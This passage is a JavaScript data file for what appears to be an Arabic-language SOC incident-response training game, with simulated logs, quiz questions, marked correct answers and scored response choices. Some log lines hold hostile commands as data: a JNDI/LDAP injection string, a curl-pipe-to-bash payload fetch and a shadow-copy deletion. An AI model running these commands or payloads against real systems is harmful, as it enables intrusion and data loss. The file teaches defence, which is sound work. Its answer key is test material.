export const CASES = [
  {
    id: "INC-0417",
    incidentTitle: "Suspicious Login Detected",
    severity: "HIGH",
    meta: "User: jsmith · Time: 10:41 UTC",
    brief:
      "تلقى فريق SOC تنبيهًا بشأن نشاط تسجيل دخول غير معتاد على حساب الموظف jsmith. مهمتك كمحلل: مراجعة السجلات، تحديد المؤشر الأهم، ثم اتخاذ القرار المناسب.",
    logCommand: "logs --tail auth-service,file-service",
    logLines: [
      "10:41:02  auth-service   login_success   user=jsmith  ip=41.35.12.4  geo=Cairo,EG",
      "10:41:55  auth-service   login_success   user=jsmith  ip=185.220.101.7  geo=Amsterdam,NL",
      "10:42:10  auth-service   mfa_prompt_sent  user=jsmith  ip=185.220.101.7",
      "10:42:14  auth-service   mfa_denied       user=jsmith  ip=185.220.101.7",
      "10:42:19  auth-service   mfa_denied       user=jsmith  ip=185.220.101.7",
      "10:42:33  auth-service   mfa_success      user=jsmith  ip=185.220.101.7",
      "10:43:02  file-service   download         user=jsmith  file=payroll_2026.xlsx  size=14MB",
    ],
    evidenceQuestion: "ما هو المؤشر الأهم على وجود اختراق فعلي؟",
    evidenceOptions: [
      {
        id: "ip-jump",
        label: "دخول من نفس الحساب لكن من موقعين جغرافيين متباعدين خلال ثوانٍ",
        correct: true,
      },
      {
        id: "file-size",
        label: "حجم الملف الذي تم تحميله كبير بشكل غير معتاد",
        correct: false,
      },
      {
        id: "mfa-retry",
        label: "محاولة تسجيل الدخول تمت خلال ساعات الدوام الرسمي",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. قفزة الموقع الجغرافي خلال ثوانٍ مستحيلة فعليًا، وهي المؤشر الأقوى هنا.",
    evidenceFeedbackIncorrect:
      "✗ ليس المؤشر الأقوى. راجع فرق التوقيت والموقع الجغرافي بين المحاولتين.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "lock",
        label: "تعليق الحساب فورًا وإجبار المستخدم على إعادة تعيين كلمة المرور",
        outcome:
          "قرار صحيح. تعليق الحساب يوقف أي نشاط إضافي فورًا، وإعادة تعيين كلمة المرور تمنع استخدام بيانات الدخول المسروقة مرة أخرى.",
        points: 40,
      },
      {
        id: "escalate",
        label: "تصعيد الحادثة لفريق الاستجابة دون اتخاذ إجراء مباشر",
        outcome:
          "إجراء جزئي. التصعيد مهم، لكن ترك الحساب نشطًا أثناء الانتظار يمنح المهاجم وقتًا إضافيًا للوصول إلى بيانات أخرى.",
        points: 20,
      },
      {
        id: "monitor",
        label: "مراقبة الحساب لمدة 24 ساعة قبل اتخاذ أي قرار",
        outcome:
          "قرار متأخر. نجاح تسجيل الدخول بعد محاولات MFA فاشلة مؤشر قوي على اختراق فعلي، والانتظار يزيد المخاطر.",
        points: 5,
      },
      {
        id: "ignore",
        label: "تجاهل الحادثة باعتبارها إنذارًا كاذبًا",
        outcome:
          "قرار خاطئ. القفزة الجغرافية مع فشل MFA المتكرر ثم النجاح المفاجئ هي نمط اختراق كلاسيكي لا يجب تجاهله.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-0512",
    incidentTitle: "Phishing Email Campaign",
    severity: "MEDIUM",
    meta: "Reported by: HR Dept · Time: 09:15 UTC",
    brief:
      "أبلغت إحدى الموظفات عن بريد إلكتروني مريب يطلب تحديث كلمة المرور بشكل عاجل. مهمتك: تحليل رأس البريد (headers) والرابط المرفق، وتحديد ما إذا كان تصيّدًا احتياليًا، ثم اتخاذ القرار المناسب لحماية بقية الموظفين.",
    logCommand: "mail --inspect-headers msg_id=8841",
    logLines: [
      'From: "IT Support" <it-support@cybertracc-security.com>',
      "Reply-To: helpdesk@secure-mail-updates.ru",
      "To: h.ahmed@cybertrace.io",
      "Subject: تحديث عاجل - يلزم تغيير كلمة المرور خلال 24 ساعة",
      "SPF: fail (domain does not match sending server)",
      "Link: hxxp://cybertrace-login.security-update-portal.info/reset",
      "Attachment: none",
    ],
    evidenceQuestion: "ما هو المؤشر الأهم على أن هذا البريد تصيّد احتيالي؟",
    evidenceOptions: [
      {
        id: "domain-lookalike",
        label:
          "نطاق المرسل (cybertracc-security.com) يشبه النطاق الرسمي لكنه ليس مطابقًا له، وفشل فحص SPF",
        correct: true,
      },
      {
        id: "urgent-tone",
        label: "الرسالة تستخدم أسلوبًا يحث على الاستعجال",
        correct: false,
      },
      {
        id: "no-attachment",
        label: "الرسالة لا تحتوي على أي مرفقات",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. النطاق المزيّف مع فشل SPF دليل تقني قاطع على انتحال الهوية، وهو أقوى من أي مؤشر أسلوبي.",
    evidenceFeedbackIncorrect:
      "✗ هذا مؤشر داعم لكنه ليس الأقوى. راجع نطاق المرسل الفعلي وفحص SPF في الرأس.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "report-block",
        label:
          "الإبلاغ لفريق الأمن لحظر النطاق المزيّف على مستوى الشركة، وتنبيه جميع الموظفين",
        outcome:
          "قرار صحيح. حظر النطاق يمنع وصول الحملة لبقية الموظفين، والتنبيه العام يقلل احتمال وقوع ضحايا آخرين قبل فوات الأوان.",
        points: 40,
      },
      {
        id: "delete-only",
        label: "حذف البريد من صندوق الموظفة فقط دون إبلاغ فريق الأمن",
        outcome:
          "إجراء جزئي. حذفت التهديد من مكان واحد، لكن الحملة قد تكون وصلت لموظفين آخرين لم يبلّغوا بعد.",
        points: 15,
      },
      {
        id: "click-verify",
        label: "فتح الرابط شخصيًا للتأكد من أنه فعلاً مزيّف",
        outcome:
          "قرار خطر. فتح رابط تصيّد حتى بنية التحقق قد يعرّض جهازك وبيانات اعتمادك للخطر مباشرة.",
        points: 0,
      },
      {
        id: "assume-filter",
        label: "تجاهل البلاغ لأن فلاتر البريد العشوائي ستتعامل معه تلقائيًا",
        outcome:
          "قرار خاطئ. وصول الرسالة لصندوق الموظفة يثبت أنها تجاوزت الفلاتر فعلاً، والاعتماد عليها هنا غير كافٍ.",
        points: 5,
      },
    ],
  },
  {
    id: "INC-0633",
    incidentTitle: "Ransomware Encryption Alert",
    severity: "HIGH",
    meta: "Host: FIN-WS-14 · Time: 02:07 UTC",
    brief:
      "تلقى مركز العمليات تنبيهًا من محطة عمل في قسم المالية يشير إلى نشاط تشفير جماعي للملفات في وقت غير معتاد من الليل. مهمتك: تحديد أقوى مؤشر على وجود فدية نشطة، ثم اتخاذ القرار الذي يمنع انتشارها.",
    logCommand: "edr --timeline host=FIN-WS-14",
    logLines: [
      "02:07:11  edr   process_start   name=svchost32.exe  path=C:\\Users\\public\\Downloads",
      "02:07:14  edr   file_write      count=340  ext_change=.docx->.locked  share=\\\\FIN-SHARE\\reports",
      "02:07:16  edr   file_write      count=810  ext_change=.xlsx->.locked  share=\\\\FIN-SHARE\\reports",
      "02:07:20  edr   process_exec    cmd=\"vssadmin delete shadows /all /quiet\"",
      "02:07:24  edr   file_create     name=README_RESTORE.txt  path=C:\\Users\\public\\Desktop",
      "02:07:31  net   connection      dst=185.220.101.44:443  proto=tls  bytes_out=2.1MB",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على وجود هجوم فدية نشط الآن؟",
    evidenceOptions: [
      {
        id: "mass-encrypt",
        label:
          "تغيير جماعي وسريع لامتدادات مئات الملفات إلى .locked عبر أكثر من مشاركة شبكية",
        correct: true,
      },
      {
        id: "night-time",
        label: "النشاط حدث في وقت متأخر من الليل خارج ساعات الدوام",
        correct: false,
      },
      {
        id: "process-name",
        label: "اسم العملية svchost32.exe يشبه عملية نظام Windows شرعية",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. تغيير مئات الملفات لنفس الامتداد خلال ثوانٍ عبر مشاركات متعددة نمط تشفير فدية كلاسيكي، لا يحدث بأي عملية شرعية.",
    evidenceFeedbackIncorrect:
      "✗ مؤشر داعم لكنه ليس الأقوى. ركّز على حجم وسرعة تغييرات الملفات نفسها.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "isolate",
        label:
          "عزل الجهاز عن الشبكة فورًا، وحفظ نسخة جنائية منه قبل أي إجراء آخر",
        outcome:
          "قرار صحيح. العزل الفوري يوقف انتشار التشفير لبقية المشاركات، والحفظ الجنائي يحافظ على الأدلة لتحليل لاحق.",
        points: 40,
      },
      {
        id: "restore-only",
        label: "استرجاع الملفات من النسخة الاحتياطية دون عزل الجهاز",
        outcome:
          "إجراء ناقص. الجهاز المصاب لسا متصل بالشبكة وقادر يشفّر أي نسخة جديدة تُستعاد، أو ينتشر لأجهزة أخرى.",
        points: 15,
      },
      {
        id: "pay-note",
        label: "التواصل مع المهاجمين عبر الملاحظة المتروكة للتفاوض",
        outcome:
          "قرار خاطئ تمامًا. التفاوض مع المهاجمين لا يضمن استرجاع الملفات، وقد يشجع على هجمات مستقبلية.",
        points: 0,
      },
      {
        id: "wait-confirm",
        label: "الانتظار للتأكد أن الأمر ليس إنذارًا كاذبًا قبل التحرك",
        outcome:
          "قرار متأخر. حذف نسخ الظل (vssadmin) وحده مؤشر كافٍ لا يحتاج انتظارًا؛ كل ثانية تأخير تزيد عدد الملفات المشفّرة.",
        points: 5,
      },
    ],
  },
  {
    id: "INC-0701",
    incidentTitle: "Remote Code Execution via Unpatched Server",
    severity: "HIGH",
    meta: "Host: web-prod-03 · Time: 14:52 UTC",
    brief:
      "رصد جدار الحماية طلبات غريبة تستهدف تطبيق ويب لم يُحدَّث منذ فترة. مهمتك: تحليل السجلات لتحديد ما إذا كان هناك استغلال فعلي لثغرة تنفيذ أوامر عن بُعد، ثم تحديد الاستجابة الصحيحة.",
    logCommand: "waf --requests host=web-prod-03",
    logLines: [
      'POST /search  User-Agent: "${jndi:ldap://45.152.68.9:1389/Exploit}"',
      "14:52:03  app    outbound_conn   dst=45.152.68.9:1389  proto=ldap",
      "14:52:06  app    process_exec    cmd=\"curl -s http://45.152.68.9/payload.sh | bash\"",
      "14:52:09  os     user_create     name=svc_backup  group=sudoers",
      "14:52:11  waf    rule_hit        rule=generic-404  count=3  (unrelated background noise)",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على استغلال فعلي لثغرة تنفيذ أوامر عن بُعد؟",
    evidenceOptions: [
      {
        id: "jndi-ldap",
        label:
          "طلب يحتوي على صيغة استغلال jndi:ldap تلاه فعليًا اتصال خارجي وتنفيذ أمر تحميل وتشغيل سكربت",
        correct: true,
      },
      {
        id: "traffic-volume",
        label: "ارتفاع عدد الطلبات الواردة للتطبيق خلال هذه الدقيقة",
        correct: false,
      },
      {
        id: "waf-404",
        label: "ظهور عدة طلبات برمز خطأ 404 في نفس الفترة",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. تسلسل الاستغلال (jndi:ldap ← اتصال خارجي ← تنفيذ أمر) دليل تقني مباشر على نجاح الهجوم، وليس مجرد محاولة.",
    evidenceFeedbackIncorrect:
      "✗ هذا ضجيج عادي في السجلات ولا يدل على استغلال فعلي. ركّز على تسلسل الاستغلال نفسه.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "patch-isolate",
        label:
          "عزل الخادم عن الشبكة، حظر الاتصال بالنطاق الخارجي، وتحديث التطبيق فورًا، مع مراجعة الحسابات المُنشأة حديثًا",
        outcome:
          "قرار صحيح. العزل يمنع أي تحكم إضافي عن بُعد، والحظر يقطع قناة الاتصال، ومراجعة الحسابات تكشف أي وصول دائم زرعه المهاجم.",
        points: 40,
      },
      {
        id: "monitor-only",
        label: "مراقبة السجلات لبعض الوقت لتأكيد الاستغلال قبل التحرك",
        outcome:
          "قرار متأخر. تسلسل الاستغلال مكتمل بالفعل ووصل لتنفيذ أمر فعلي على الخادم، لا حاجة لمزيد من المراقبة قبل التحرك.",
        points: 10,
      },
      {
        id: "restart-server",
        label: "إعادة تشغيل الخادم فقط لإنهاء أي عمليات ضارة نشطة",
        outcome:
          "غير كافٍ. إعادة التشغيل لا تصلح الثغرة نفسها ولا تلغي الحساب الجديد الذي أنشأه المهاجم؛ الاستغلال قد يتكرر فورًا.",
        points: 5,
      },
      {
        id: "trust-waf",
        label: "تجاهل التنبيه لأن جدار الحماية يفترض أن يمنع مثل هذه الطلبات",
        outcome:
          "قرار خاطئ. سجلات التطبيق تثبت أن الطلب تجاوز الحماية فعليًا ونُفّذ على مستوى النظام.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-0755",
    incidentTitle: "Insider Data Exfiltration",
    severity: "MEDIUM",
    meta: "User: r.tarek · Time: 19:40 UTC",
    brief:
      "أظهر نظام مراقبة البيانات نشاطًا غير معتاد لأحد الموظفين الذي قدّم استقالته قبل يومين. مهمتك: تحليل نمط الوصول للملفات وتحديد ما إذا كان تسريب بيانات متعمدًا، ثم تحديد الاستجابة المناسبة.",
    logCommand: "dlp --activity user=r.tarek",
    logLines: [
      "19:40:02  dlp   file_access     user=r.tarek  file=customers_master.csv  rows=48000",
      "19:40:15  dlp   upload_detected user=r.tarek  dest=personal-drive.google.com  size=22MB",
      "19:41:03  dlp   file_access     user=r.tarek  file=pricing_contracts_2026.xlsx",
      "19:41:22  dlp   upload_detected user=r.tarek  dest=personal-drive.google.com  size=9MB",
      "19:41:40  hr    note            resignation_date=2026-08-14  last_working_day=2026-08-21",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على أن هذا تسريب بيانات متعمد؟",
    evidenceOptions: [
      {
        id: "post-resignation-upload",
        label:
          "رفع ملفات حساسة (بيانات عملاء وعقود تسعير) إلى حساب تخزين سحابي شخصي بعد تقديم الاستقالة مباشرة",
        correct: true,
      },
      {
        id: "off-hours",
        label: "الوصول للملفات تم بعد ساعات الدوام الرسمي",
        correct: false,
      },
      {
        id: "file-count",
        label: "عدد الملفات التي تم فتحها في نفس الجلسة",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. رفع بيانات حساسة لحساب شخصي بالتزامن مع الاستقالة نمط تسريب بيانات معروف، ويتجاوز مجرد سوء استخدام عرضي.",
    evidenceFeedbackIncorrect:
      "✗ هذا مؤشر سياقي فقط. الدليل الحاسم هو وجهة الرفع ونوع الملفات نفسها.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "revoke-legal",
        label:
          "تعليق صلاحيات الوصول فورًا، حفظ سجلات التدقيق كاملة، وإبلاغ الشؤون القانونية والموارد البشرية",
        outcome:
          "قرار صحيح. تعليق الوصول يمنع تسريب بيانات إضافية، وحفظ السجلات ضروري لأي إجراء قانوني لاحق مع الموظف.",
        points: 40,
      },
      {
        id: "wait-hr-meeting",
        label: "الانتظار حتى اجتماع خروج الموظف المقرر نهاية الأسبوع لمناقشة الأمر",
        outcome:
          "قرار متأخر. الموظف لا يزال يملك صلاحيات وصول كاملة لعدة أيام، وقد يواصل نقل بيانات إضافية خلالها.",
        points: 15,
      },
      {
        id: "confront-directly",
        label: "مراسلة الموظف مباشرة لسؤاله عن سبب الرفع",
        outcome:
          "قرار غير مناسب. مواجهة الموظف مباشرة قبل تأمين الأدلة قد تدفعه لحذف أثر إضافي أو تعقيد أي إجراء قانوني لاحق.",
        points: 5,
      },
      {
        id: "assume-backup",
        label: "افتراض أنه نسخ احتياطي شخصي عادي وإغلاق التنبيه",
        outcome:
          "قرار خاطئ. طبيعة الملفات (بيانات عملاء وعقود تسعير) لا تدعم فرضية النسخ الاحتياطي الشخصي إطلاقًا.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-0812",
    incidentTitle: "Brute Force Attack on Admin Panel",
    severity: "MEDIUM",
    meta: "Endpoint: /admin/login · Time: 04:18 UTC",
    brief:
      "لاحظ نظام المراقبة عددًا كبيرًا من محاولات تسجيل الدخول الفاشلة على لوحة تحكم الإدارة خلال دقائق معدودة. مهمتك: تحليل النمط وتحديد ما إذا نجح الهجوم، ثم اتخاذ القرار المناسب لتأمين الحساب.",
    logCommand: "logs --tail admin-panel",
    logLines: [
      "04:18:01  admin-panel   login_fail   user=admin       ip=91.243.12.8",
      "04:18:02  admin-panel   login_fail   user=administrator  ip=91.243.12.8",
      "04:18:03  admin-panel   login_fail   user=root         ip=91.243.12.8",
      "...        (212 محاولة فاشلة إضافية بنفس النمط خلال 6 دقائق)",
      "04:24:47  admin-panel   login_success  user=admin      ip=91.243.12.8",
      "04:24:52  admin-panel   settings_change  action=disable_2fa  by=admin",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على أن هذا هجوم Brute Force ناجح؟",
    evidenceOptions: [
      {
        id: "success-after-flood",
        label:
          "مئات المحاولات الفاشلة بأسماء مستخدمين مختلفة من نفس عنوان IP، تلتها محاولة ناجحة ثم تعطيل المصادقة الثنائية فورًا",
        correct: true,
      },
      {
        id: "single-ip",
        label: "كل المحاولات جاءت من عنوان IP واحد فقط",
        correct: false,
      },
      {
        id: "early-hour",
        label: "الهجوم حدث في ساعة مبكرة جدًا من الفجر",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. النجاح المفاجئ بعد مئات المحاولات، متبوعًا بتعطيل فوري للمصادقة الثنائية، يثبت أن الحساب اخترق فعليًا وليس مجرد محاولة.",
    evidenceFeedbackIncorrect:
      "✗ هذا جزء من النمط لكنه وحده لا يثبت النجاح. الدليل الحاسم هو ما حدث بعد المحاولات الفاشلة مباشرة.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "block-reset-2fa",
        label:
          "حظر عنوان الـ IP، إعادة تعيين كلمة مرور حساب admin فورًا، وإعادة تفعيل المصادقة الثنائية",
        outcome:
          "قرار صحيح. حظر المصدر يوقف أي محاولات إضافية، وإعادة التعيين تسترجع السيطرة على الحساب المخترق، وتفعيل المصادقة يمنع تكرار الاختراق بنفس الطريقة.",
        points: 40,
      },
      {
        id: "block-ip-only",
        label: "حظر عنوان الـ IP فقط دون تغيير كلمة المرور",
        outcome:
          "إجراء ناقص. الحساب لا يزال مخترقًا وكلمة مروره معروفة للمهاجم، وقد يعاود الدخول من عنوان آخر.",
        points: 20,
      },
      {
        id: "monitor-pattern",
        label: "الاكتفاء بمراقبة النمط لبضع ساعات إضافية",
        outcome:
          "قرار متأخر. الاختراق حدث بالفعل وتم تعطيل حماية الحساب، كل دقيقة تأخير تزيد من قدرة المهاجم على التحرك داخل النظام.",
        points: 5,
      },
      {
        id: "assume-2fa-safe",
        label: "تجاهل التنبيه لأن الحساب يفترض أنه محمي بالمصادقة الثنائية أصلًا",
        outcome:
          "قرار خاطئ. السجلات تُظهر أن المصادقة الثنائية عُطّلت فعليًا من داخل الحساب بعد الاختراق مباشرة.",
        points: 0,
      },
    ],
  },
  {
    id: "INC-0890",
    incidentTitle: "Exposed Cloud Storage Bucket",
    severity: "MEDIUM",
    meta: "Bucket: cybertrace-uploads-prod · Time: 06:30 UTC",
    brief:
      "نبّه فاحص أمني آلي إلى أن حاوية تخزين سحابية تحتوي بيانات إنتاج أصبحت متاحة للقراءة من أي شخص على الإنترنت. مهمتك: تحديد أخطر مؤشر على وجود تسريب فعلي، ثم إغلاق الثغرة بأمان.",
    logCommand: "cloud-audit --bucket cybertrace-uploads-prod",
    logLines: [
      "06:30:02  audit   bucket_policy   acl=public-read  objects=1,204",
      "06:30:05  audit   object_sample   name=customer_invoices_2026.pdf",
      "06:31:40  access  download        ip=103.87.44.2   object=customer_invoices_2026.pdf",
      "06:32:11  access  download        ip=45.61.184.9    object=api_keys_backup.env",
      "06:33:00  scanner findings        severity=MEDIUM  rule=public-bucket-sensitive-data",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على وجود تسريب بيانات فعلي؟",
    evidenceOptions: [
      {
        id: "public-acl-sensitive",
        label:
          "صلاحية الحاوية مضبوطة على قراءة عامة (public-read) وتحتوي ملفات حساسة تم تحميلها فعليًا من عناوين خارجية",
        correct: true,
      },
      {
        id: "download-count",
        label: "عدد مرات التحميل المسجلة خلال الساعة الأخيرة",
        correct: false,
      },
      {
        id: "geo-ip",
        label: "الموقع الجغرافي لعناوين IP التي قامت بالتحميل",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. الإعداد الخاطئ (public-read) مع تحميل فعلي لملفات حساسة من الخارج يعني أن التسريب حدث بالفعل، وليس مجرد احتمال نظري.",
    evidenceFeedbackIncorrect:
      "✗ مؤشر ثانوي. الدليل الحاسم هو إعداد الصلاحيات نفسه ونوع الملفات المكشوفة.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "private-rotate-audit",
        label:
          "تحويل الحاوية إلى خاصة فورًا، تدوير أي مفاتيح API ظهرت داخل الملفات المكشوفة، ومراجعة كل ما تم تحميله",
        outcome:
          "قرار صحيح. تحويل الصلاحية يوقف أي وصول إضافي، وتدوير المفاتيح يمنع استغلال ما تم تسريبه فعلاً، والمراجعة تحدد حجم الضرر الحقيقي.",
        points: 40,
      },
      {
        id: "delete-bucket",
        label: "حذف الحاوية بالكامل دون مراجعة محتواها أولاً",
        outcome:
          "إجراء متسرع. حذف الحاوية دون معرفة أي ملفات أو مفاتيح كانت مكشوفة يمنعك من تقييم حجم التسريب أو تدوير ما يلزم تدويره.",
        points: 15,
      },
      {
        id: "wait-maintenance",
        label: "جدولة الإصلاح ضمن نافذة الصيانة الدورية القادمة",
        outcome:
          "قرار خاطئ. البيانات مكشوفة للجميع الآن، وأي تأخير يعني تسريبًا مستمرًا يمكن تفاديه بإجراء بسيط وفوري.",
        points: 0,
      },
      {
        id: "email-team-only",
        label: "إرسال بريد إلكتروني للفريق بالمشكلة دون اتخاذ إجراء تقني مباشر",
        outcome:
          "غير كافٍ. التبليغ مهم لكنه لا يوقف التسريب؛ الحاوية تبقى مكشوفة طوال فترة انتظار رد الفريق.",
        points: 5,
      },
    ],
  },
  {
    id: "INC-0944",
    incidentTitle: "Distributed Denial-of-Service on Public API",
    severity: "HIGH",
    meta: "Endpoint: /api/checkout · Time: 11:05 UTC",
    brief:
      "بدأ زمن استجابة واجهة الدفع بالتدهور بشكل حاد مع ارتفاع مفاجئ في الطلبات من آلاف العناوين المختلفة. مهمتك: التفريق بين هجوم حقيقي وزيادة طلب مشروعة، ثم تحديد الاستجابة الصحيحة.",
    logCommand: "waf --metrics endpoint=/api/checkout",
    logLines: [
      "11:05:00  api   requests_per_sec   value=180   baseline=40",
      "11:05:12  api   unique_ips          count=14,200  window=1min",
      "11:05:20  infra cpu_usage           value=98%",
      "11:05:33  api   response_time_p95   value=9.4s   baseline=280ms",
      "11:06:01  marketing  note          scheduled_sale_campaign=false",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على أن هذا هجوم DDoS وليس زيادة طلب طبيعية؟",
    evidenceOptions: [
      {
        id: "unique-ip-spike",
        label:
          "ارتفاع مفاجئ في الطلبات من أكثر من 14 ألف عنوان IP مختلف خلال دقيقة واحدة على نفس نقطة النهاية، مع عدم وجود حملة تسويقية مجدولة",
        correct: true,
      },
      {
        id: "cpu-high",
        label: "استهلاك المعالج وصل إلى 98%",
        correct: false,
      },
      {
        id: "response-time",
        label: "زمن الاستجابة ارتفع بشكل ملحوظ",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. العدد الهائل من العناوين الفريدة خلال وقت قصير جدًا، مع تأكيد عدم وجود سبب تسويقي مشروع، هو الدليل الفاصل بين الهجوم والزيادة الطبيعية.",
    evidenceFeedbackIncorrect:
      "✗ هذا عرَض ناتج عن الحمل الزائد، مو دليل يميّز هجوم DDoS عن زيادة طلب مشروعة.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "mitigate-verify",
        label:
          "تفعيل الحماية من DDoS (تحديد معدل الطلبات وتصفية الحركة المشبوهة) مع التأكد من فريق التسويق أنه لا توجد حملة مشروعة تفسر الارتفاع",
        outcome:
          "قرار صحيح. التخفيف الفوري يحمي الخدمة، والتحقق من السبب المحتمل يمنع حظر عملاء حقيقيين بالخطأ.",
        points: 40,
      },
      {
        id: "take-offline",
        label: "إيقاف الخدمة بالكامل لإنهاء الهجوم",
        outcome:
          "رد فعل مبالغ فيه. إيقاف الخدمة يحقق للمهاجم هدفه مجانًا (حرمان الخدمة) ويضر بالعملاء الشرعيين أيضًا.",
        points: 15,
      },
      {
        id: "auto-scale-trust",
        label: "الاعتماد على التوسع التلقائي للسيرفرات دون أي إجراء إضافي",
        outcome:
          "غير كافٍ. التوسع التلقائي يرفع التكلفة فقط دون إيقاف الهجوم، وقد ينهار النظام قبل أن يلحق التوسع بالحمل.",
        points: 5,
      },
      {
        id: "block-country",
        label: "حظر كل الحركة القادمة من الدولة التي منها معظم العناوين",
        outcome:
          "حل خشن وغير دقيق. يحظر عملاء شرعيين من نفس الدولة، وهجمات DDoS الحديثة غالبًا موزّعة عالميًا فلن يوقف الهجوم فعليًا.",
        points: 10,
      },
    ],
  },
  {
    id: "INC-1002",
    incidentTitle: "Unauthorized Privilege Escalation",
    severity: "HIGH",
    meta: "User: m.saleh · Time: 03:12 UTC",
    brief:
      "رصد نظام إدارة الهوية إضافة حساب موظف عادي إلى مجموعة \"Domain Admins\" ذات الصلاحيات الكاملة، دون وجود أي طلب تغيير معتمد. مهمتك: تحديد ما إذا كان هذا تصعيد صلاحيات غير مصرّح به، ثم اتخاذ القرار المناسب.",
    logCommand: "iam --audit group=Domain-Admins",
    logLines: [
      "03:12:01  iam   group_change   user=m.saleh  action=add  group=Domain Admins",
      "03:12:03  iam   change_ticket  ref=none_found",
      "03:12:15  iam   login          user=m.saleh  ip=41.60.22.9  device=unregistered",
      "03:13:40  iam   access         user=m.saleh  resource=backup-server-prod",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على أن هذا تصعيد صلاحيات غير مصرّح به؟",
    evidenceOptions: [
      {
        id: "no-ticket-privileged",
        label:
          "إضافة حساب لمجموعة صلاحيات كاملة دون أي طلب تغيير معتمد، من جهاز غير مسجّل",
        correct: true,
      },
      {
        id: "it-role",
        label: "الحساب يتبع لموظف يعمل في قسم الدعم الفني عادةً",
        correct: false,
      },
      {
        id: "logged-normally",
        label: "التغيير ظهر بشكل طبيعي في سجلات النظام",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. غياب طلب تغيير معتمد مع دخول من جهاز غير مسجّل دليل واضح على أن هذا ليس إجراءً إداريًا شرعيًا.",
    evidenceFeedbackIncorrect:
      "✗ هذا لا ينفي أو يثبت شيئًا بمفرده. الدليل الحاسم هو غياب الموافقة الرسمية على التغيير نفسه.",
    decisionQuestion: "ما هو الإجراء المناسب الآن؟",
    decisions: [
      {
        id: "revoke-investigate",
        label:
          "سحب الصلاحيات المرتفعة فورًا، والتحقيق فيما إذا كان الحساب نفسه مخترقًا أو أن صاحبه تصرّف بشكل متعمد",
        outcome:
          "قرار صحيح. سحب الصلاحيات يوقف أي ضرر إضافي فورًا، والتحقيق يحدد هل المشكلة اختراق حساب أم سلوك داخلي متعمد، وهذا يغيّر خطوات المعالجة اللاحقة.",
        points: 40,
      },
      {
        id: "wait-manager",
        label: "الانتظار حتى يؤكد مدير الموظف الأمر في يوم العمل التالي",
        outcome:
          "قرار متأخر. الحساب يملك صلاحيات كاملة الآن ووصل بالفعل لخادم نسخ احتياطي حساس؛ الانتظار يمنح وقتًا إضافيًا لأي ضرر محتمل.",
        points: 15,
      },
      {
        id: "assume-automated",
        label: "افتراض أن التغيير جاء من عملية آلية معتادة",
        outcome:
          "قرار خاطئ. غياب أي طلب تغيير مسجّل ينفي فرضية العملية الآلية المعتمدة تمامًا.",
        points: 0,
      },
      {
        id: "log-for-audit",
        label: "توثيق الحادثة فقط لمراجعتها في التدقيق الدوري القادم",
        outcome:
          "غير كافٍ في حادثة نشطة. الصلاحيات المرتفعة ما زالت فعالة والوصول لخادم حساس حدث بالفعل؛ التوثيق وحده لا يوقف الخطر.",
        points: 5,
      },
    ],
  },
  {
    id: "INC-1055",
    incidentTitle: "Supply Chain Compromise via Third-Party Package",
    severity: "HIGH",
    meta: "Package: log-utils-plus@4.2.1 · Time: 20:18 UTC",
    brief:
      "خلال بناء دوري للتطبيق، أضاف تحديث روتيني لمكتبة برمجية شائعة كودًا يتصل بخادم خارجي مجهول أثناء عملية التثبيت. مهمتك: تحديد المؤشر الأقوى على اختراق سلسلة التوريد البرمجية، ثم احتواء الضرر.",
    logCommand: "ci-scan --package log-utils-plus@4.2.1",
    logLines: [
      "20:18:02  ci    dependency_update   pkg=log-utils-plus  from=4.2.0  to=4.2.1",
      "20:18:05  scanner  flag             rule=new-postinstall-script  pkg=log-utils-plus",
      "20:18:07  ci    outbound_conn        dst=unknown-cdn-relay.net:443  during=postinstall",
      "20:18:09  ci    secret_exposure_risk  vars=AWS_SECRET,DB_PASSWORD  scope=build-env",
      "20:18:40  registry  maintainer_note   verified_publisher=true",
    ],
    evidenceQuestion: "ما هو المؤشر الأقوى على وجود اختراق فعلي في سلسلة التوريد البرمجية؟",
    evidenceOptions: [
      {
        id: "postinstall-outbound",
        label:
          "إضافة سكربت postinstall جديد في التحديث نفسه يقوم باتصال خارجي مجهول أثناء عملية البناء، مع تعرّض متغيرات سرية للبيئة",
        correct: true,
      },
      {
        id: "verified-publisher",
        label: "الحزمة منشورة من ناشر موثّق على السجل الرسمي",
        correct: false,
      },
      {
        id: "bundle-size",
        label: "حجم الحزمة زاد قليلاً بعد التحديث",
        correct: false,
      },
    ],
    evidenceFeedbackCorrect:
      "✓ صحيح. سكربت تثبيت جديد يتصل بخادم مجهول ويحصل على متغيرات سرية دليل تقني مباشر على كود خبيث مُدرج في التحديث، بغض النظر عن سمعة الحزمة.",
    evidenceFeedbackIncorrect:
